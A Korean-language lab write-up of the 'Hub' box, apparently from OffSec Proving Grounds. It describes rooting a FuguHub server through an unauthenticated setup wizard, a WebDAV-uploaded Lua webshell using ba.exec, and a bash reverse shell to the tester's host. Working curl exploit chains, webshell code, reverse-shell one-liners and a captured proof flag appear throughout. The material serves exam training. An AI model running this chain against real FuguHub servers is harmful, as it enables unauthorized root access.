> 이 오류가 위험한 이유는 같은 노트 1장이 *"`DNS:FuguHub.local`처럼 내부 도메인이 새기도 한다 — `/etc/hosts`에 등록해두면 vhost 기반 라우팅을 놓치지 않는다"* 고 정확히 조언하기 때문이다. 그런데 2-3장은 인증서에 없는 값을 "인증서에서 얻었다"고 썼다. 인증서에서 얻은 도메인은 `/etc/hosts`에 등록할 실제 후보인데, 지어낸 값을 섞어 적으면 그 목록이 오염되고 다음 박스에서 vhost를 헛짚게 된다. **내가 지어낸 값과 타겟이 준 값을 섞어 쓰지 마라.** 프론트매터 `domain:` 필드도 그래서 제거했다(이 박스는 확인된 vhost 도메인이 없다).

필드 이름을 어떻게 알아냈는지도 적어둔다. `.lsp`는 서버측에서 실행되므로 소스를 직접 못 읽지만, 필드 이름은 네 갈래로 얻을 수 있다. 가장 확실한 것은 폼을 렌더한 HTML을 받아 `<input name=...>` 를 긁는 것이다.

```bash
   curl -s http://TARGET:8082/Config-Wizard/wizard/SetAdmin.lsp | grep -oiE 'name="[^"]+"'
```

이때 `<form action=`과 `method=`를 함께 봐서 POST 대상이 자기 자신인지 다른 경로인지 확인한다 — 이 박스는 자기 자신에게 POST한다. 브라우저 DevTools 네트워크 탭에서 한 번 제출하고 요청 바디를 그대로 복사하는 방법도 있고 시험에서도 허용된다. 마지막이 애플리케이션 배포본을 얻어 읽는 것인데, 이 박스는 80에서 `/applications/Config-Wizard.zip`(71872바이트)이 그대로 다운로드된다. 설정 마법사의 소스가 통째로 노출돼 있는 셈이다. 순서로는 이쪽이 정석이다 — 공개된 아카이브가 보이면 폼을 추측하기 전에 그걸 먼저 받는다.

`-d`와 `--data-urlencode`의 구분도 여기서 짚고 간다. `-d 'a=1&b=2'`는 이미 인코딩된 문자열을 그대로 보내고 `&`를 필드 구분자로 해석한다. `--data-urlencode 'a=값'`은 값에 든 `&`·공백·`'`·`"`·`(`·`)`를 curl이 인코딩해준다. `SetAdmin.lsp` 단계는 값에 특수문자가 없어 `-d`로 충분하다. 반면 **3장의 명령 실행 단계는 반드시 `--data-urlencode`** 다. `c=bash -i >& /dev/tcp/...` 에는 공백·`&`·`>`가 들어 있어 `-d`로 보내면 `&` 지점에서 파라미터가 잘려 명령이 반토막 난다. "왜 명령이 안 먹히지" 하며 시간을 태우는 대표적 원인이 이것이다.

`-i`로 응답 헤더까지 받는 이유도 있다. 이 제품은 성공/실패를 본문 문구로만 알려주고 상태 코드는 200으로 고정이라, 헤더와 본문을 함께 봐야 판정이 된다. [[Crane]]·[[Hawat]]에서 반복된 "응답이 성공을 뜻하지 않는다" 패턴이다.

### 2-4. WebDAV 업로드가 RCE로 승격되는 조건

`PUT`이 된다고 전부 RCE가 되지는 않는다. 네 조건이 동시에 맞아야 한다.

| # | 조건 | 이 박스에서의 상태 | 확인 방법 |
|---|---|---|---|
| 1 | `PUT`/`MKCOL`이 실제로 허용 | ✅ `OPTIONS`에 `PUT` 존재, 실측 `201 Created` | `curl -i -X OPTIONS` → 실제로 `-T`로 던져본다 |
| 2 | 업로드 경로가 웹으로 다시 서빙됨 | ✅ `/fs/x.lsp` → `GET /x.lsp` | 무해한 텍스트 파일을 올리고 GET으로 회수 |
| 3 | 업로드된 확장자가 서버측에서 실행됨 | ✅ `.lsp`가 Lua Server Pages로 실행 | 산술식 테스트(아래) |
| 4 | 확장자·MIME 필터가 없음 | ✅ 필터 없음 | `.txt` → `.lsp` 순으로 올려 비교 |

**2번이 가장 자주 깨진다.** WebDAV 공유가 `/var/dav/`처럼 웹 루트 밖을 가리키면 파일은 올라가지만 실행되지 않는다. 이 박스는 Web-File-Server의 공유 루트가 웹 루트와 동일해서 성립했다.

> [!tip] 단계를 쪼개 검증한다 — 한 번에 리버스셸부터 던지지 마라
> ```
> ① 업로드가 되는가            → 201/204 확인
> ② 다시 읽히는가              → GET으로 회수
> ③ 서버측에서 실행되는가       → 무해한 산술식 (7*7 → 49)
> ④ 명령이 실행되는가           → id
> ⑤ 리버스셸
> ```
> 리버스셸부터 던지면 안 붙었을 때 원인이 다섯 중 어디인지 모른다. 업로드가 실패한 건지, 실행이 안 되는 건지, 방화벽인지 포트인지 — 한 번에 다섯 개 가설을 안게 된다.
> 덧셈이 아니라 곱셈을 쓰는 이유는 `7+7=14`나 `77` 같은 문자열 연결과 헷갈리는 결과를 피하려는 것이다. `49`는 입력 어디에도 나타나지 않으므로 에코가 아니라 실행임이 확정된다.

### 2-5. Lua 샌드박스 — 무엇이 죽었고 무엇이 살아 있는가

LSP(Lua Server Pages)는 `<?lsp ... ?>` 안의 Lua를 서버에서 실행한다. PHP의 `<?php ?>`, JSP의 `<% %>`와 같은 계열이다.

교과서적인 Lua 웹셸은 이렇게 쓴다:

```lua
local h = io.popen("id"); response:write(h:read("*a"))
```

그런데 FuguHub의 LSP 런타임은 `io` 테이블에서 `popen`을 제거해뒀다. 호출하면 "`popen`이라는 필드는 함수가 아니다"라는 취지의 에러로 죽는다.

> [!warning] 문구를 그대로 외우지 마라 — 표준 Lua의 문구는 이것이다
> 이 노트는 원래 에러를 `field 'popen' is not callable` 로 적어놨었다. 그 문자열은 Lua 코어에 존재하지 않는다. Kali에 `lua5.4`를 넣고 그대로 재현해봤다:
>
> ```
> $ lua5.4 -e 'local t={}; print(pcall(function() return t.popen() end))'
> false	(command line):1: attempt to call a nil value (field 'popen')
> ```
>
> 표준 Lua(5.1~5.4)가 nil 필드를 호출할 때 내는 것은 `ldebug.c`의 `typeerror()`가 만드는 `attempt to call a nil value (field 'popen')` 이다.
> Barracuda 런타임이 자체적으로 문구를 래핑했을 가능성은 있으나 확인 수단이 없다(타겟 정지). 그래서 이 노트에서는 문구를 인용하지 않고 의미로 적는다.
>
> 하필 이 절(2-5)이 "에러 문구를 정확히 읽어라"고 가르치는 장이라 더 나쁜 오류였다. 가르치는 문구 자체가 부정확하면 교훈이 무너진다. 게다가 틀린 문구를 그대로 구글에 넣으면 검색 결과가 0건이 나와 "희귀한 커스텀 런타임인가" 하고 엉뚱한 방향으로 간다.

문구가 바뀌어도 의미로 분류하는 법은 그대로 쓸 수 있고, 실전 자산은 이쪽이다.

| 에러 계열 (표준 Lua 기준) | 뜻 | 다음 수 |
|---|---|---|
| `attempt to call a nil value (field 'popen')` | 그 필드가 nil이다. 샌드박스가 함수를 걷어냈다 | 다른 API를 찾는다 — 제품 확장 API 포함 |
| `attempt to index a nil value (global 'io')` | `io` 테이블 자체가 없다. 더 강한 샌드박스 | 전역 테이블부터 열거한다 |
| `permission denied` / 빈 출력 / rc≠0 | 함수는 살아 있는데 OS·정책 레벨에서 막힌다 | 다른 실행 주체를 찾는다 — AppArmor·seccomp·`open_basedir` 계열 의심 |

셋은 대응이 완전히 다르다. 에러를 대충 보고 "샌드박스라서 안 되네"로 뭉뚱그리면 잘못된 방향으로 간다. 런타임이 표준이 아니면 문구도 다르므로, **읽어야 할 것은 문구가 아니라 "무엇이 nil인가 / 무엇이 거부됐는가"** 다.

핵심 기법은 `pcall`로 감싸 에러를 응답에 노출시키는 것이다.

```lua
local ok, err = pcall(function() return <시험할 표현식> end)
response:write(tostring(ok) .. " | " .. tostring(err))
```

`pcall`(protected call)은 Lua의 예외 처리다. 감싸지 않으면 에러가 500으로 튀어 본문이 빈 응답이 오고, 무엇이 왜 실패했는지 알 수 없다. 감싸면 실패 이유가 HTTP 본문으로 돌아온다. 샌드박스를 관측하는 장치가 이것이다.

> [!tip] 살아 있는 API 관측 루틴 — 다른 언어에도 그대로 적용된다
> 존재 여부와 호출 가능 여부를 한 번에 훑는다:
> ```lua
> <?lsp
> local cand = {"os.execute","os.getenv","io.popen","io.open","ba.exec",
>               "ba.openio","require","loadstring","dofile"}
> for _,n in ipairs(cand) do
>   local ok, v = pcall(load("return " .. n))
>   response:write(n .. " = " .. tostring(ok) .. "/" .. type(v) .. "\n")
> end
> ?>
> ```
> 같은 발상의 타 언어 버전:
> - PHP: `phpinfo()`의 `disable_functions`, 없으면 `foreach(['system','exec','shell_exec','passthru','popen','proc_open'] as $f) echo $f.'='.(function_exists($f)?'Y':'N');`
> - Python: `__builtins__` 덤프, `os`/`subprocess` import 시도
> - Java/JSP: `Runtime.getRuntime()` vs `ProcessBuilder` — SecurityManager 유무
>
> **막혔을 때 "안 되네"로 끝내지 말고 무엇이 남아 있는지 목록으로 뽑는다.** 샌드박스는 벽이 아니라 체다.

FuguHub에서 살아 있는 것은 Barracuda 런타임의 `ba` 네임스페이스였다. `ba.exec()`가 명령을 실행하고 stdout을 문자열로 되돌려준다.

샌드박스 설계자는 보통 표준 라이브러리의 위험 함수부터 지운다 — `io.popen`, `os.execute`. 그런데 자기 제품이 추가한 확장 API는 지우는 것을 잊고, `ba.exec`가 정확히 그 경우다. 임베디드·전용 런타임을 만나면 그 제품의 API 문서나 배포본의 `.lua`/`.js` 파일을 뒤져 "실행"·"프로세스"·"파일" 계열 함수를 찾아라. 표준 함수가 막혔다는 사실 자체가 커스텀 API는 안 막혔다는 힌트다.

### 2-6. 버전 판정의 인식론 — 근거의 개수가 아니라 독립성

이 박스에서 가져갈 것이 여기 있다. 근거 3개가 서로 일치했는데 3개 다 틀렸다.

| # | 근거 | 값 | 가리킨 결론 |
|---|---|---|---|
| ① | `readme.txt` 첫 줄 | `Changes for 8.0   July 2019` | 8.0 / 2019 |
| ② | SSL 인증서 `Not valid before` | `2019-07-16T19:15:09` | 2019 |
| ③ | 8082 인덱스 `Last-Modified` | `2019-07-19` | 2019 |
| — | 실제 | `/rtl/about.lsp` | **8.4** |

셋이 일치하니 신뢰도가 높아 보이지만, 사실 셋은 같은 뿌리에서 나온 하나의 근거다:

```
                  2019년에 만들어진 FuguHub 배포 아카이브
                  (readme.txt · 자체서명 인증서 · 정적 파일들)
                             │
        ┌────────────────────┼────────────────────┐
        ▼                    ▼                    ▼
   ① readme.txt        ② SSL 인증서 날짜     ③ Last-Modified
        └────────────── 전부 "아카이브가 만들어진 시점" ──┘
                             │
                    실행 중인 바이너리 버전과 무관
```

배포본은 2019년에 패키징됐고, 이후 버전 업그레이드에서 바이너리만 교체되고 부속 정적 파일은 그대로 남았다. 셋 다 "아카이브 생성 시점"이라는 동일한 사실을 세 각도에서 본 것일 뿐이라 **독립 증거가 하나도 없었다.**

독립성을 확인하는 데는 30초면 된다. 근거를 나열한 뒤 각각에 대해 세 가지를 묻는다. 첫째, 이 값을 누가 언제 만들었나 — 빌드·패키징 시점에 고정된 값이면 정적 증거라 런타임 버전과 무관할 수 있고, 요청을 받고 그 자리에서 생성된 값이면 동적 증거라 실행 중인 코드가 만든 것이다. 둘째, 이 근거들이 같은 파일·같은 아카이브·같은 배포에서 왔나 — 그렇다면 개수를 세지 마라, 근거 1개다. 셋째, 이 값이 업그레이드 때 갱신되나 — readme·인증서·정적 파일 mtime처럼 갱신 안 되는 값은 최하위 신뢰도다. **여러 근거가 일치한다는 것은 신뢰의 근거가 아니고, 서로 다른 생성 경로를 가진 근거가 일치하는 것이 신뢰의 근거다.**

동적(런타임) 증거를 얻는 실전 수단:

| 수단 | 명령 | 비고 |
|---|---|---|
| About/버전 페이지 | `curl -s -u U:P http://T:P/rtl/about.lsp \| grep -i <제품명>` | 최상위. 인증이 필요할 때가 많으므로 자격증명 확보 후 즉시 확인 `[가정 — 이 박스에서 `/rtl/about.lsp`가 무인증으로도 열렸는지는 미확정이다. 1장 표 참조]`. 순서로는 무인증으로도 열리는지 먼저 때려보는 쪽이 앞선다 — 열려 있으면 자격증명을 기다릴 이유가 없다 |
| API 버전 필드 | `/api/version`, `/status.php`, `/api/v1/info`, `/actuator/info` | JSON이므로 `-x json` 을 안 걸면 fuzz에 안 잡힌다 |
| 에러 페이지 지문 | 존재하지 않는 경로/잘못된 파라미터로 스택트레이스 유도 | 프레임워크 버전이 새기도 함 |
| 바이너리 자체 | 셸 획득 후 `strings /var/www/html/FuguHub \| grep -iE '[0-9]+\.[0-9]+'` | 사후 확인용이지만 가장 확실하다 |

favicon·로고 해시로 버전을 가르는 기법도 여기서는 실패했다. 8.0과 8.4가 바이트 동일이라 구분이 안 됐다. 같은 함정의 변주다 — 정적 리소스는 버전이 올라가도 안 바뀌는 것이 정상이다. 해시 비교는 "다르면 버전이 다르다"만 말해줄 뿐 "같으면 버전이 같다"는 성립하지 않는다.

그런데 이 박스에서 실제로 뚫은 경로는 버전과 무관했다. `/Config-Wizard/`가 302를 주는 것을 보고 들어갔을 뿐이다. 버전은 어떤 exploit을 검색할지 정할 때만 필요하고, 무인증 경로 목록을 뽑는 표면 열거는 버전을 몰라도 된다. **버전 판정에 20분 이상 쓰고 있다면 방향이 틀렸다** — 시험에서 버전이 안 잡히면 표면 열거로 우회하는 것이 정석이다. [[Levram]]·[[RubyDome]]·[[Astronaut]]와 같은 "버전 판정은 독립 근거 2개" 패턴 색인에 이 박스를 넣는 이유다.

---

## 3. Foothold

### Step 1 — 관리자 계정 선점

`/Config-Wizard/wizard/SetAdmin.lsp`는 인증이 없다. 자기 자신에게 POST해서 관리자 계정을 만든다.

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -i -X POST 'http://192.168.248.25:8082/Config-Wizard/wizard/SetAdmin.lsp' \
     -d 'email=admin@hub.local&user=admin&password=password'
HTTP/1.1 200 OK
...
Administrator Account Saved
```

**자격증명 확보: `admin` / `password`** (HTTP Basic)

성공했다는 문구만 믿지 말고 실제로 인증이 통하는지 401/200 차이로 확증한다:

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -o /dev/null -w "%{http_code}\n" http://192.168.248.25:8082/rtl/protected/
401
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -o /dev/null -w "%{http_code}\n" -u admin:password http://192.168.248.25:8082/rtl/protected/
200
```

`-o /dev/null -w "%{http_code}\n"` 는 본문을 버리고 상태 코드만 뽑는 조합이다. 같은 요청을 자격증명 유무로 두 번 던져 401 → 200 전이를 확인하는 것이 자격증명 검증의 표준형이다. `-w`에는 다른 변수도 있다 — `%{time_total}`은 time-based 판정에, `%{size_download}`는 응답 길이 차 판정에, `%{redirect_url}`은 302 추적에 쓴다. `-o /dev/null`을 빼면 본문이 화면을 덮어 코드가 묻히고, `-w`를 빼면 코드를 보려고 `-i`+`head`를 쓰게 되어 스크립트화가 어려워진다.

> [!warning] 이 공격은 한 번만 쓸 수 있다
> 계정을 만들고 나면 같은 페이지가 이렇게 바뀐다:
>
> ```
> <h1>User database already saved</h1>
> <li>Delete the user database file:<br/>"/var/www/html/user.dat"</li>
> ```
>
> 다시 쓰려면 `/var/www/html/user.dat`를 지워야 하는데 그러려면 이미 셸이 있어야 한다. 누가 먼저 선점하면 끝이므로 실전이라면 이 표면을 발견한 즉시 잡아야 한다.

> [!danger] Metasploit 모듈이 있지만 이 박스에 쓰면 손해다
> FuguHub 8.1 CVE-2023-24078(EDB 51550)은 공개 익스플로잇이 있고, Metasploit 모듈 형태로도 유통된다 `[가정 — 실측하지 않았다]`.
> **OSCP 시험에서 Metasploit은 전체 시험 중 단 1대에만 쓸 수 있다.** Fundamental 난이도 박스에 그 한 장을 소모하는 것은 낭비다.
>
> 수동 대안은 전체 체인 4줄이고, 시험 자산은 이쪽이다:
> ```bash
> # ① 관리자 선점
> curl -s -X POST 'http://T:8082/Config-Wizard/wizard/SetAdmin.lsp' \
>      -d 'email=a@b.c&user=admin&password=password'
> # ② 웹셸 업로드 (WebDAV PUT)
> curl -s -u admin:password -T shell.lsp http://T:8082/fs/shell.lsp
> # ③ 명령 실행
> curl -s -u admin:password --data-urlencode 'c=id' http://T:8082/shell.lsp
> # ④ 리버스셸
> curl -s -u admin:password --data-urlencode \
>      'c=setsid bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1" &' http://T:8082/shell.lsp
> ```
> 공개 exploit 스크립트를 읽을 때도 이 4줄로 환원해서 이해한다. 그러면 스크립트가 실패해도 손으로 이어갈 수 있다.

### Step 2 — `.lsp` 업로드로 코드 실행

Web-File-Server(`/fs/`)는 WebDAV 파일 매니저이고 공유 루트가 웹 루트와 같다. `PUT /fs/x.lsp` 로 올린 뒤 `GET /x.lsp` 로 요청하면 LSP(Lua Server Pages)로 실행된다 — 실측으로 확인한 것은 이 조합이다.

RCE 시도 전에 서버측 실행 자체가 되는지 산술식으로 먼저 확인한다:

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ printf '%s' '<?lsp response:write("PWNTEST=" .. tostring(7*7)) ?>' > /tmp/t1.lsp

┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password -T /tmp/t1.lsp http://192.168.248.25:8082/fs/t1.lsp
HTTP/1.1 201 Created

┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password http://192.168.248.25:8082/t1.lsp
PWNTEST=49
```

`-T`를 쓴 것은 이게 HTTP `PUT`으로 파일 본문을 그대로 올리기 때문이다. `-d @파일`은 `POST` + 폼 인코딩이라 WebDAV 업로드가 안 된다. `-u admin:password`는 `/fs/`가 realm `Web File Server`로 보호되니 빼면 401이다. `echo` 대신 `printf '%s'`를 쓴 것은 개행 없이 파일을 만들기 위해서다 — `echo`는 끝에 `\n`을 붙이고, LSP는 태그 밖 문자를 그대로 출력하므로 응답에 빈 줄이 섞여 비교·파싱이 지저분해진다. `echo -n`은 셸에 따라 동작이 갈린다.

그리고 업로드는 `/fs/t1.lsp`인데 실행은 `/t1.lsp`다. **경로가 다르다는 것이 이 단계의 함정이다.** `/fs/`는 WebDAV 파일 매니저의 네임스페이스이고, 실행은 웹 루트 경로에서 확인했다. `/fs/` 쪽으로 GET했을 때 무엇이 오는지는 이 박스에서 확인하지 않았다 `[가정 — 파일 매니저가 소스를 그대로 돌려줄 가능성이 높다]`.

⚠️ 이 노트는 원래 *"`/fs/t1.lsp`를 GET하면 파일 매니저가 소스를 그대로 돌려준다(실행 안 됨)"* 를 실측처럼 단정했으나, 원본·산출물 어디에도 `/fs/x.lsp`를 GET한 기록이 없다. 6장 ⑦도 같은 항목을 "실측 기록 없음" 표에 넣어놨으니 내부 모순이었던 셈이다. 확인된 것은 웹 루트 경로에서 실행됐다는 것뿐이다. 다음에 이 유형을 만나면 `GET /fs/x.lsp`와 `GET /x.lsp`를 나란히 놓고 응답을 비교하는 30초짜리 확정 절차를 반드시 거칠 것.

`201 Created`는 서버가 새 리소스를 만들었다는 확답이다. 덮어쓰기였다면 `204 No Content`가 온다. 이 코드 차이로 파일이 이미 존재했는지까지 알 수 있다.

### Step 3 — `io.popen` 차단 → `ba.exec()`

교과서적 Lua 웹셸은 `io.popen`을 쓰는데 FuguHub의 LSP 샌드박스는 이걸 제거해놨다. `io.popen`이 nil이라 호출 자체가 실패한다(표준 Lua라면 `attempt to call a nil value (field 'popen')`, 제품 런타임에 따라 문구는 다를 수 있다. 2-5 참조).

대신 Barracuda 런타임이 노출하는 `ba.exec()`가 살아 있고 stdout을 캡처해 돌려준다. `pcall`로 감싸 에러까지 응답에 찍게 만든 것이 여기서 중요하다 — 뭐가 왜 막혔는지 보여야 다음 수를 고른다.

```lua
<?lsp
local c = request:data("c") or "id"
local ok,a,b,cc = pcall(function() return ba.exec(c) end)
response:write("ba.exec ok="..tostring(ok).." => "..tostring(a).." | "..tostring(b).." | "..tostring(cc).."\n")
?>
```

`request:data("c")` 는 요청 파라미터 `c`를 GET 쿼리스트링과 POST 폼 양쪽에서 읽는다. 뒤의 `or "id"` 는 파라미터가 없을 때 쓰는 기본값이자, 웹셸이 살아 있는지 파라미터 없이 확인하는 안전장치다. `pcall(function() ... end)` 이 예외를 잡아주는데 이게 없으면 500에 빈 본문이 와서 실패 원인을 못 본다. `local ok,a,b,cc` 로 넷을 받는 것은 `pcall`의 첫 반환이 성공 여부이고 나머지가 감싼 함수의 다중 반환값이기 때문이다 — Lua 함수는 여러 값을 돌려주므로 몇 개인지 모를 때는 넉넉히 받아 전부 찍는다. `tostring(...)` 은 `nil`도 문자열로 만들어준다. 빼면 `nil` 연결에서 또 에러가 나 아무것도 못 본다. 사이에 낀 구분자는 반환값 경계를 눈으로 가르기 위한 것이다.

미지의 런타임을 다룰 때는 이 "전부 찍기" 스타일이 정석이다. 깔끔한 웹셸은 API를 이미 알 때 쓰는 것이고, 모를 때는 관측 장비부터 만든다.

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password -T /tmp/x.lsp http://192.168.248.25:8082/fs/x.lsp
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password --data-urlencode 'c=id' http://192.168.248.25:8082/x.lsp
ba.exec ok=true => uid=0(root) gid=0(root) groups=0(root)
```

**이미 uid=0이다.** 여기서 열거를 계속하는 것은 전부 낭비다 — 곧바로 4장으로 넘어간다.

### Step 4 — 인터랙티브 root 셸

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ tmux new-session -d -s hub 'rlwrap nc -lvnp 4444'

┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password --data-urlencode \
    'c=setsid bash -c "bash -i >& /dev/tcp/192.168.45.207/4444 0>&1" &' \
    http://192.168.248.25:8082/x.lsp
```

```bash
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.25] 46868
root@debian:/var/www/html# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@debian:/var/www/html# id; hostname; cat /root/proof.txt
uid=0(root) gid=0(root) groups=0(root)
debian
702262325fd3a55a2f23d49e0256571c
```

`setsid ... &`로 띄우는 이유는 웹 요청이 셸 프로세스를 물고 늘어져 HTTP 응답이 안 돌아오는 것을 피하기 위해서다. ([[Crane]]에서 겪은 "익스가 멈춘 것처럼 보이는" 현상의 예방책)

리버스셸 한 줄을 조각으로 뜯어보면 이렇다.

```
setsid bash -c "bash -i >& /dev/tcp/192.168.45.207/4444 0>&1" &
```

| 조각 | 역할 | 빼면 |
|---|---|---|
| `setsid` | 새 세션·프로세스 그룹으로 분리 | 웹 요청이 끝나며 프로세스가 함께 죽거나, 부모가 자식을 기다려 HTTP 응답이 영영 안 온다 |
| `bash -c "..."` | 리다이렉션을 해석할 셸을 명시 | `ba.exec`가 `/bin/sh`나 `execve`로 넘기면 `>&`·`/dev/tcp`가 bash 전용 문법이라 안 먹는다 |
| `bash -i` | 인터랙티브 셸 (프롬프트·잡컨트롤) | 프롬프트가 없어 상태 파악이 어렵다 |
| `>& /dev/tcp/IP/PORT` | stdout+stderr를 TCP 소켓으로 | bash의 가상 파일이라 `sh`에는 없다 |
| `0>&1` | stdin도 같은 소켓에서 | 출력만 오고 명령을 못 친다 |
| `&` | 백그라운드 | `setsid`와 함께 요청을 즉시 반환시킨다 |
| `rlwrap` | 리스너 쪽 readline 래퍼 | 화살표 키·명령 히스토리가 안 먹는다. TTY 업그레이드 전 임시 방편 |
| `tmux new-session -d` | 리스너를 백그라운드 세션에 | 터미널을 하나 더 안 열어도 된다. 연결이 끊겨도 세션이 살아 있다 |

리버스셸이 안 붙을 때는 순서대로 의심한다.

1. **명령이 애초에 실행됐나** — `c=id`로 되돌아가 확인. 이게 안 되면 셸 문제가 아니라 RCE 문제다
2. **`&`가 파라미터를 잘랐나** — `-d`로 보내면 `0>&1`의 `&`에서 잘린다. `--data-urlencode`를 썼는지 확인
3. **아웃바운드 포트가 막혔나** — 4444가 안 되면 443·80·53을 시도([[Hawat]]는 443만 열려 있었다)
4. **`bash`가 없나** — `/bin/sh`만 있는 최소 이미지면 `>&`·`/dev/tcp`가 안 먹는다. `nc -e`, `mkfifo` 방식, `python`/`perl` 원라이너로 전환
5. **리스너가 실제로 떠 있나** — `ss -lntp | grep 4444`
6. **VPN 인터페이스 IP가 맞나** — `ip a show tun0`. `eth0` IP를 쓰면 영영 안 붙는다

이 박스는 4444가 그대로 통했으므로 어느 것에도 걸리지 않았다.

> [!tip] TTY 업그레이드 — `python3`가 있어서 운이 좋았다
> ```bash
> python3 -c 'import pty;pty.spawn("/bin/bash")'
> ```
> Debian 11에는 `python3`가 기본 설치라 통했다. 없을 때의 대안:
> ```bash
> script -qc /bin/bash /dev/null      # 가장 범용
> perl -e 'exec "/bin/bash";'
> /usr/bin/expect -c 'spawn /bin/bash; interact'
> ```
> 이어서 완전한 TTY로 만들려면 (로컬 `Ctrl+Z` 후)
> ```bash
> stty raw -echo; fg
> export TERM=xterm-256color; stty rows 50 cols 200
> ```
> ([[Hawat]]은 Arch 최소 설치라 `python3`가 없어 `script`로 넘어가야 했다)

---

## 4. 권한상승

**없다.** `ba.exec`의 첫 실행이 이미 `uid=0(root)`을 돌려줬다.

### 왜 이미 root인가

```bash
root@debian:/var/www/html# cat /etc/systemd/system/fuguhub.service
[Unit]
Description=FuguHub Service
After=network.target

[Service]
ExecStart=/var/www/html/FuguHub
WorkingDirectory=/var/www/html
User=root
Group=root
Restart=always
```

`User=root` — 권한상승 단계가 아예 없는 박스다.

> [!warning] `[가정 — 유닛 파일 원문 미보존]` 이 블록은 재현 검증에 실패했다
> 위 유닛 파일은 원본 노트에서부터 있던 블록이지만(개작이 지어낸 것은 아니다), `~/PG/Hub/`에 대응하는 산출물이 없어 원문 대조가 불가능하다. 그리고 두 가지가 제품 관례와 어긋난다. `ExecStart=/var/www/html/FuguHub` — 같은 박스에서 회수한 설정 파일이 `bdd.conf`(BarracudaDrive Daemon)인데, FuguHub/BarracudaDrive 계열의 데몬 실행 파일은 통상 `bd`다. 유닛명 `fuguhub.service`도 같은 이유로 `bd.service`류일 가능성이 있다.
>
> 결론이 바뀌지는 않는다. `ba.exec('id')`가 실측으로 `uid=0(root)`을 돌려줬으므로 서비스가 root로 돈다는 사실 자체는 확정이고, 불확실한 것은 유닛 파일의 정확한 내용과 이름뿐이다.
>
> ⚠️ 4장 전체(왜 root인가)와 8장 방어 표가 이 블록을 근거로 삼는다. 그래서 지우지 않고 표기만 강등했다. 다시 이 박스를 리버트하면 확인할 명령:
> ```bash
> systemctl list-units --type=service | grep -iE 'fugu|barracuda|bd'
> systemctl cat <찾은 유닛명>
> ```
> **권한상승 장의 "왜 그런가"를 설명하는 설정 파일은 원문을 파일로 남겨라.** 셸이 끊기면 되찾을 수 없고, 기억으로 재구성한 설정 파일은 그럴듯하게 틀린다.

FuguHub는 8082·9999를 쓰므로 1024 미만 특권 포트가 필요하지도 않다. 그런데도 root다. 이런 제품이 root로 도는 이유는 대개 셋 중 하나다.

| 이유 | 설명 |
|---|---|
| 파일 서버 기능 | Web-File-Server가 "디스크 아무 곳이나" 공유하려면 광범위한 파일 접근이 필요하다. 개발자가 권한 설계 대신 root로 도망간 것 |
| 특권 포트 | 80/443을 옵션으로 지원 → 항상 root로 시작 |
| 설치 스크립트의 관성 | `systemd` 유닛에 `User=`를 안 적으면 기본값이 root다. 명시적으로 쓰지 않은 결과 |

이 박스는 세 번째가 아니다. 위에 인용한 유닛에는 `User=root`가 명시돼 있다 — 빠뜨린 것이 아니라 의도적으로 root를 지정한 것이다. 8082/9999만 쓰는데도 그렇다는 점에서 첫 번째, 파일 서버 기능 쪽으로 보인다 `[가정]`.

세 번째는 일반론으로는 여전히 맞다. `User=` 줄이 없는 유닛 파일이 root로 도는 것은 systemd 시스템 인스턴스의 기본값이고 "설정 실수"의 대표형이다. 다만 이 박스를 그 사례로 인용하면 안 된다. 명시된 `User=root`와 생략된 `User=`는 보고서에서 지적할 문장이 다르다 — 전자는 설계 결정을 재검토하라는 말이고, 후자는 명시하지 않아 기본값이 적용됐다는 말이다.

> [!tip] 셸을 잡자마자 칠 명령 5개 — 그리고 순서가 중요한 이유
> ```bash
> id                                  # ← ①  여기서 uid=0이면 나머지 4개는 불필요
> sudo -l
> find / -perm -4000 -type f 2>/dev/null
> getcap -r / 2>/dev/null
> cat /etc/crontab; ls -la /etc/cron.*
> ```
> `id`가 1번인 이유가 이 박스다. 이미 root인데 SUID 열거를 돌리면 몇 분을 그냥 버린다. 시험에서 이 습관 하나가 박스당 5~10분을 아낀다.
>
> 서비스 실행 주체를 확인하는 명령도 함께 반사로 만들어 둔다:
> ```bash
> ps -eo user,comm,args --sort=user | grep -vE '^root .*\[' | head -40
> systemctl cat <서비스명> | grep -iE '^(User|Group|ExecStart)='
> grep -rniE '^\s*(User|Group)\s*=' /etc/systemd/system/ 2>/dev/null
> ```

이 패턴은 예외가 아니다. [[Hawat]]은 nginx·php-fpm이 `user root;`로 떠서 웹셸이 곧 root였고 구조가 동일하다. 애플리케이션 계층에서 코드 실행을 얻었는데 그 애플리케이션이 root로 돌면 권한상승 장이 통째로 없어진다. 반대 방향으로도 써먹을 수 있다 — 웹셸을 심을 위치를 고를 수 있다면 누가 실행하는지부터 확인한다. 같은 호스트에 웹서버가 둘이면 실행 uid가 다를 수 있다.

---

## 5. 플래그

```bash
root@debian:/var/www/html# find / -name local.txt 2>/dev/null
       (없음)
root@debian:/var/www/html# ls /root/
email4.txt  proof.txt
root@debian:/var/www/html# cat /root/email4.txt
MENURkBvZmZzZWMuY29t          # base64 → 0CTF@offsec.com  (미끼)
root@debian:/var/www/html# grep -vE 'nologin|false' /etc/passwd
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
offsec:x:1000:1000:,,,:/home/offsec:/bin/bash
```

| | |
|---|---|
| `proof.txt` | `702262325fd3a55a2f23d49e0256571c` |
| `local.txt` | 존재하지 않음 — 이 박스는 플래그 1개 |

`/home/offsec`은 비어 있다. 포털 진행도가 `0/1`이면 user 플래그는 없다 — `find`로 교차 확인하고 넘어간다.

